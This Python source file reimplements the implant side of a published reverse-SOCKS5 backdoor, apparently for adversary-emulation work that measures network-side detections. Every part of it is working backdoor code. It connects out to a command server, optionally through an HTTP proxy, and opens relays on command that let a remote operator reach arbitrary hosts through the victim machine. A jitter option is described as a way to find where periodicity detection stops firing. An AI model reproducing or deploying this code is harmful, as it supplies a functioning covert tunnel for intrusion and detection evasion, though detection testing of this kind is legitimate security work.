#!/usr/bin/env python3
"""The implant half of a reverse SOCKS5 tunnel, faithful to its original on the wire.

This is a reimplementation of the client side of the Python reverse-SOCKS
backdoor that InfoGuard Labs documented in "Slithering Through the Noise"
(2026-04-09). It exists for one purpose: to put that family's traffic on a
network so a network-side detection can be measured against it.

**Faithful on the wire, and deliberately nowhere else.** Every byte this
sends and expects matches the published client. None of its class names,
credentials or typos are reproduced, because the published YARA rules key on
those and this is a network-layer exercise -- a file that trips a file-based
rule would be quarantined by the very endpoints it is supposed to run on.

## The wire

The published client is the only description of this protocol that exists;
the server side was never published. Everything below was derived by reading
it, and `server/server.py` is written to the same derivation.

It is SOCKS5 with pieces removed. Not a variant of RFC 1928 -- a dialect
that will confuse anything expecting the real thing:

  * **No version bytes.** The greeting is `nmethods | methods`, where RFC
    1928 has `05 | nmethods | methods`. The request is
    `cmd | atyp | addrlen`, where the RFC has `05 | cmd | 00 | atyp`.
  * **Ports are little-endian** -- `struct.pack('H', ...)` with no byte-order
    prefix, on every platform this ever ran on. The RFC says network order.
  * **Status codes are inverted.** `1` means success and `0` means failure,
    where the RFC uses `0` for success.
  * **`addrlen` is always present**, even for IPv4, where it is then ignored
    because four bytes are read regardless.
  * **No BIND, no UDP ASSOCIATE, no IPv6.** All three are refused.

The command connection is simpler still: the server sends a `uint16`
little-endian port number and the client dials it. A zero is a keep-alive,
which the client answers with a zero of its own -- the two bytes `00 00`
that a Shodan probe of one of these C2 servers reports, and the fingerprint
that let researchers enumerate the infrastructure across hosting providers.

## The one property the whole measurement rests on

`_SOCKET_TIMEOUT` is 120 seconds in the original, and it applies to the
command connection's two-byte read. So:

  * If the server sends a keep-alive **more often than every 120 s**, this
    process holds **one TCP connection** open indefinitely. A proxy logs one
    CONNECT and then bytes. There is no cadence to find.
  * If the server is **quieter than that**, the read times out, the client
    tears the connection down and builds a new one -- producing a
    reconnect every ~120 seconds, which is a cadence a proxy log shows.

And the asymmetry that is easy to miss: if the server *closes* the command
connection, the original does not reconnect. It reads zero bytes, `struct`
raises, and the process exits. Only a timeout restarts it. So the cadence is
120 seconds or nothing, and the server cannot choose a different one.

`--timeout` exposes that constant because a measurement may want a cadence
other than 120 s. **Changing it is a deviation from the original** and the
help text says so.

`--jitter` spreads that deadline, which is the only place jitter can live: the
reconnect period *is* the deadline, so the server cannot produce a jittered
cadence at all. It does not choose the period -- if it closes the connection
this process exits rather than reconnecting, and if it merely goes quiet the
deadline here decides when. Jitter is how you walk the coefficient of
variation upward and find where a periodicity detection stops firing, and it
is a deviation the original does not have.

## Getting out

The original dials its C2 directly and cannot cross a proxy. This adds
`--proxy`, and for the measurement it is not optional but required: a
network-side detection that reads proxy logs sees nothing at all from a host
with direct egress. The proxy leg is transport only -- the bytes inside the
tunnel are unchanged, which is what keeps this faithful where it matters.
"""

import argparse
import errno
import logging
import os
import random
import select
import socket
import struct
import sys
import threading
import time

LOG = logging.getLogger("tunnel.client")

# The original's module constant, and the reason this file has a measurement
# design at all. See the module docstring.
_SOCKET_TIMEOUT = 120.0

# struct formats, named so the deviations from RFC 1928 are visible at every
# use rather than buried in a literal.
_U8 = struct.Struct("B")
_U16_LE = struct.Struct("H")        # NOT network order -- the original's bug
_TRIPLE = struct.Struct("BBB")      # cmd, atyp, addrlen
_PAIR = struct.Struct("BB")

_CMD_CONNECT = 1
_ATYP_IPV4 = 1
_ATYP_DOMAIN = 3
_ATYP_IPV6 = 4

_AUTH_NONE = 0
_AUTH_USERPASS = 2
_AUTH_UNACCEPTABLE = 255

_REPLY_OK = 1                       # inverted against RFC 1928
_REPLY_FAIL = 0

_RELAY_CHUNK = 16384
_RECONNECT_WAIT = 30.0              # the original's retry gap


class _Closed(Exception):
    """The peer went away in an orderly fashion."""


class _Timeout(Exception):
    """A read waited out `_SOCKET_TIMEOUT` and found nothing.

    This is the exception the whole measurement turns on: on the command
    connection it means reconnect, which is what produces a cadence.
    """


def _recv_exactly(sock, count, deadline):
    """Read exactly `count` bytes or raise.

    The original polls with `select` and a wall-clock deadline rather than
    setting a socket timeout, so a partial read does not reset the clock.
    This keeps that behaviour because the deadline is the thing being
    measured.
    """
    chunks = []
    have = 0
    while have < count:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise _Timeout()
        ready, _, _ = select.select([sock], [], [], min(remaining, 1.0))
        if not ready:
            continue
        try:
            chunk = sock.recv(count - have)
        except OSError as exc:
            raise _Closed(str(exc))
        if not chunk:
            raise _Closed("peer closed after %d of %d bytes" % (have, count))
        chunks.append(chunk)
        have += len(chunk)
    return b"".join(chunks)


def _connect_direct(address, timeout):
    return socket.create_connection(address, timeout=timeout)


def _connect_through_proxy(proxy, address, timeout):
    """Open a CONNECT tunnel and hand back the socket.

    Not in the original, and required by the measurement rather than by the
    protocol: a detection that reads proxy logs needs the traffic to pass a
    proxy. Everything written into the returned socket is the unmodified
    dialect.
    """
    sock = socket.create_connection(proxy, timeout=timeout)
    target = "%s:%d" % address
    request = (
        "CONNECT %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Proxy-Connection: Keep-Alive\r\n"
        "\r\n" % (target, target)
    )
    sock.sendall(request.encode("ascii"))

    # Read just the status line and the headers, and no further: the byte
    # after the blank line is the first byte of the tunnel.
    header = b""
    while b"\r\n\r\n" not in header:
        if len(header) > 8192:
            sock.close()
            raise OSError("proxy sent more than 8 KiB of headers")
        chunk = sock.recv(1)
        if not chunk:
            sock.close()
            raise OSError("proxy closed during CONNECT")
        header += chunk

    status = header.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    if " 200" not in status:
        sock.close()
        raise OSError("proxy refused CONNECT: %s" % status)
    LOG.debug("proxy established a tunnel to %s", target)
    return sock


class Ledger(object):
    """Ground truth, so a detection's report can be checked against fact.

    One line per event, ISO-8601 UTC. A measurement that trusts the
    detection's own timestamps has nothing independent to compare against --
    and the fields in these alerts have been found to mean something other
    than their names before.
    """

    def __init__(self, path):
        self._path = path
        self._lock = threading.Lock()

    def record(self, event, **fields):
        stamp = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        detail = " ".join("%s=%s" % (k, v) for k, v in sorted(fields.items()))
        line = "%s %s %s\n" % (stamp, event, detail)
        LOG.info("%s %s", event, detail)
        if not self._path:
            return
        with self._lock:
            with open(self._path, "a", encoding="utf-8") as handle:
                handle.write(line)
                handle.flush()


class Relay(threading.Thread):
    """One proxied TCP stream, spoken in the dialect.

    The server is the SOCKS *client* here and this process is the SOCKS
    *server* -- the inversion is the whole idea of a reverse tunnel.
    """

    daemon = True

    def __init__(self, tunnel, port):
        super(Relay, self).__init__(name="relay-%d" % port)
        self._tunnel = tunnel
        self._port = port
        self._upstream = None
        self._target = None

    def run(self):
        try:
            self._upstream = self._tunnel.dial(self._port)
        except OSError as exc:
            self._tunnel.ledger.record("relay-dial-failed",
                                       port=self._port, error=exc)
            return
        self._tunnel.ledger.record("relay-open", port=self._port)
        try:
            self._negotiate()
            target = self._request()
            self._bridge(target)
        except (_Closed, _Timeout, OSError, struct.error) as exc:
            self._tunnel.ledger.record("relay-ended",
                                       port=self._port,
                                       reason=type(exc).__name__)
        finally:
            for sock in (self._target, self._upstream):
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass

    def _deadline(self):
        return time.monotonic() + self._tunnel.timeout

    def _negotiate(self):
        """The greeting, which carries no version byte."""
        count = _U8.unpack(_recv_exactly(self._upstream, 1, self._deadline()))[0]
        methods = _recv_exactly(self._upstream, count, self._deadline())
        if _AUTH_NONE in methods:
            self._upstream.sendall(_U8.pack(_AUTH_NONE))
            return
        if _AUTH_USERPASS in methods:
            self._upstream.sendall(_U8.pack(_AUTH_USERPASS))
            # Two lengths together, then both strings -- RFC 1929 interleaves
            # them as VER ULEN UNAME PLEN PASSWD.
            ulen, plen = _PAIR.unpack(
                _recv_exactly(self._upstream, 2, self._deadline()))
            user = _recv_exactly(self._upstream, ulen, self._deadline())
            secret = _recv_exactly(self._upstream, plen, self._deadline())
            ok = (user.decode("utf-8", "replace") == self._tunnel.login
                  and secret.decode("utf-8", "replace") == self._tunnel.password)
            self._upstream.sendall(_U8.pack(_REPLY_OK if ok else _REPLY_FAIL))
            if not ok:
                raise _Closed("the server offered credentials we do not hold")
            return
        self._upstream.sendall(_U8.pack(_AUTH_UNACCEPTABLE))
        raise _Closed("no acceptable authentication method")

    def _request(self):
        """`cmd | atyp | addrlen`, then the address, then a little-endian port."""
        cmd, atyp, addrlen = _TRIPLE.unpack(
            _recv_exactly(self._upstream, 3, self._deadline()))
        if cmd != _CMD_CONNECT:
            self._upstream.sendall(_U8.pack(_REPLY_FAIL))
            raise _Closed("only CONNECT is supported, got command %d" % cmd)

        if atyp == _ATYP_IPV4:
            host = socket.inet_ntoa(
                _recv_exactly(self._upstream, 4, self._deadline()))
        elif atyp == _ATYP_DOMAIN:
            raw = _recv_exactly(self._upstream, addrlen, self._deadline())
            host = raw.decode("utf-8", "replace")
        elif atyp == _ATYP_IPV6:
            self._upstream.sendall(_U8.pack(_REPLY_FAIL))
            raise _Closed("the original refuses IPv6 and so does this")
        else:
            self._upstream.sendall(_U8.pack(_REPLY_FAIL))
            raise _Closed("unknown address type %d" % atyp)

        port = _U16_LE.unpack(
            _recv_exactly(self._upstream, 2, self._deadline()))[0]

        try:
            target = socket.create_connection((host, port),
                                              timeout=self._tunnel.timeout)
        except OSError as exc:
            self._upstream.sendall(_U8.pack(_REPLY_FAIL))
            self._tunnel.ledger.record("target-refused", host=host, port=port,
                                       error=exc.errno or 0)
            raise _Closed("could not reach %s:%d" % (host, port))

        bound_host, bound_port = target.getsockname()[:2]
        self._upstream.sendall(_U8.pack(_REPLY_OK))
        self._upstream.sendall(
            _PAIR.pack(_ATYP_IPV4, 4)
            + socket.inet_pton(socket.AF_INET, bound_host)
            + _U16_LE.pack(bound_port))
        self._tunnel.ledger.record("target-open", host=host, port=port)
        self._target = target
        return target

    def _bridge(self, target):
        """Move bytes until either side stops.

        The original polls both sockets in one loop with a zero timeout,
        which spins a core. This selects on both with a real timeout -- a
        change that alters no byte on the wire and lets the measurement run
        for hours on a host somebody else is using.
        """
        socks = [self._upstream, target]
        while True:
            ready, _, _ = select.select(socks, [], socks, 1.0)
            for sock in ready:
                other = target if sock is self._upstream else self._upstream
                try:
                    chunk = sock.recv(_RELAY_CHUNK)
                except OSError as exc:
                    raise _Closed(str(exc))
                if not chunk:
                    raise _Closed("stream ended")
                other.sendall(chunk)


class Tunnel(object):
    """The command connection, and the reconnect loop that gives it a cadence."""

    def __init__(self, address, proxy, login, password, timeout, ledger,
                 jitter=0.0):
        self.address = address
        self.proxy = proxy
        self.login = login
        self.password = password
        self.timeout = timeout
        self.jitter = max(0.0, min(jitter, 0.95))
        self.ledger = ledger
        self._stop = threading.Event()

    def deadline(self):
        """How long this attempt will wait before giving up and reconnecting.

        The reconnect period *is* this number, so jitter has to live here and
        nowhere else. The server cannot produce a jittered cadence: it does
        not choose the period at all -- if it closes the connection the
        original exits rather than reconnecting, and if it merely goes quiet
        the client's own deadline decides when. A jitter knob on the server
        would have described a control it does not have.
        """
        if self.jitter <= 0:
            return self.timeout
        spread = self.timeout * self.jitter
        return max(1.0, self.timeout + random.uniform(-spread, spread))

    def dial(self, port):
        """Open one connection to the server, directly or through the proxy."""
        where = (self.address[0], port)
        if self.proxy:
            return _connect_through_proxy(self.proxy, where, self.timeout)
        return _connect_direct(where, self.timeout)

    def stop(self):
        self._stop.set()

    def run(self):
        attempt = 0
        while not self._stop.is_set():
            attempt += 1
            try:
                self._session(attempt)
            except _Timeout:
                # The property the measurement is built on: a quiet server
                # means a new TCP connection every `timeout` seconds, and
                # that is the cadence a proxy log shows.
                self.ledger.record("command-timeout", attempt=attempt,
                                   after_seconds=round(
                                       getattr(self, "_waited",
                                               self.timeout), 2))
                continue
            except _Closed as exc:
                # The original exits here rather than reconnecting: it reads
                # zero bytes, `struct.unpack` raises, and the process is gone.
                # Reproduced, because a measurement of when the channel dies
                # is one of the things worth measuring.
                self.ledger.record("server-closed", attempt=attempt,
                                   detail=str(exc))
                return
            except OSError as exc:
                self.ledger.record("connect-failed", attempt=attempt,
                                   error=exc)
                if self._stop.wait(_RECONNECT_WAIT):
                    return

    def _session(self, attempt):
        sock = self.dial(self.address[1])
        local = sock.getsockname()
        self.ledger.record("command-open", attempt=attempt,
                           local_port=local[1],
                           via="proxy" if self.proxy else "direct")
        try:
            while not self._stop.is_set():
                waiting = self.deadline()
                self._waited = waiting
                deadline = time.monotonic() + waiting
                port = _U16_LE.unpack(_recv_exactly(sock, 2, deadline))[0]
                if port == 0:
                    # The keep-alive, and the `00 00` a scanner sees.
                    sock.sendall(_U16_LE.pack(0))
                    self.ledger.record("keepalive", attempt=attempt)
                    continue
                self.ledger.record("relay-requested", port=port)
                Relay(self, port).start()
        finally:
            self.ledger.record("command-close", attempt=attempt)
            try:
                sock.close()
            except OSError:
                pass


def _address(text, default_port):
    if ":" in text:
        host, _, port = text.rpartition(":")
        return host, int(port)
    return text, default_port


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="The implant half of a reverse SOCKS5 tunnel, faithful "
                    "to its original on the wire.")
    parser.add_argument("server",
                        help="the tunnel server, HOST or HOST:PORT "
                             "(default port 443)")
    parser.add_argument("--proxy", metavar="HOST:PORT",
                        help="reach the server through this HTTP CONNECT "
                             "proxy. NOT in the original, and required for a "
                             "measurement that reads proxy logs -- a host "
                             "with direct egress produces nothing to see.")
    parser.add_argument("--timeout", type=float, default=_SOCKET_TIMEOUT,
                        metavar="SECONDS",
                        help="the command connection's read deadline "
                             "(default %(default)s, the original's value). "
                             "A server quieter than this makes the client "
                             "reconnect, which is the cadence being "
                             "measured. CHANGING THIS IS A DEVIATION.")
    parser.add_argument("--jitter", type=float, default=0.0,
                        metavar="FRACTION",
                        help="spread the read deadline by this fraction, so "
                             "the reconnect period is uniform in "
                             "timeout*(1+-FRACTION). 0.3 turns a flat "
                             "120-second cadence into 84-156 seconds and a "
                             "coefficient of variation near 0.17, which is "
                             "how you find the jitter a periodicity "
                             "detection stops firing at. THE ORIGINAL HAS "
                             "NO JITTER; this is a deviation and the "
                             "measured CV is yours, not the family's.")
    parser.add_argument("--login", default="operator",
                        help="credential offered if the server asks for one "
                             "(the original's pair is a published detection "
                             "string and is deliberately not used)")
    parser.add_argument("--password", default="operator")
    parser.add_argument("--ledger", metavar="PATH",
                        help="append an event line per connection, keep-alive "
                             "and relay -- the ground truth to check a "
                             "detection's report against")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args(argv)

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S")

    address = _address(args.server, 443)
    proxy = _address(args.proxy, 3128) if args.proxy else None
    ledger = Ledger(args.ledger)

    if args.timeout != _SOCKET_TIMEOUT:
        LOG.warning("timeout is %.0fs, not the original's %.0fs -- the "
                    "reconnect cadence this produces is yours, not the "
                    "family's", args.timeout, _SOCKET_TIMEOUT)
    if args.jitter:
        LOG.warning("jitter %.2f spreads the deadline over %.0f-%.0fs. The "
                    "original has none, so the cadence this produces is "
                    "yours -- use it to find a detection's threshold, and "
                    "say in the finding that it was set.",
                    args.jitter, args.timeout * (1 - args.jitter),
                    args.timeout * (1 + args.jitter))

    ledger.record("client-start", server="%s:%d" % address,
                  proxy=("%s:%d" % proxy) if proxy else "none",
                  timeout=int(args.timeout), jitter=args.jitter)

    tunnel = Tunnel(address, proxy, args.login, args.password,
                    args.timeout, ledger, jitter=args.jitter)
    try:
        tunnel.run()
    except KeyboardInterrupt:
        tunnel.stop()
        ledger.record("client-interrupted")
    ledger.record("client-stop")
    return 0


if __name__ == "__main__":
    sys.exit(main())
